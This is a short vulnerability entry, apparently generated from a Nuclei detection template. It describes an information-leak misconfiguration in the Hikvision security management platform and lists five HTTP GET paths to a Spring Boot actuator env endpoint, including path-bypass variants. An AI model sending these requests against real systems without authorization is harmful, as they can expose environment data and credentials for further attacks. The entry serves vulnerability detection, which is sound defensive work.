# Vulnerability: Hikvision Springboot Env Actuator - Detect
**Classification:** MISCONFIG
**Source:** Nuclei Template (`hikvision-env.yaml`)

## Description
The HIKVISION comprehensive security management platform has information leakage vulnerabilities, through which attackers can obtain sensitive information such as environment env for further attacks

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/artemis/env
GET {{BaseURL}}/artemis-portal/artemis/env
GET {{BaseURL}}/artemis/actuator/env
GET {{BaseURL}}/artemis;/env;
GET {{BaseURL}}/artemis/1/..;/env
```

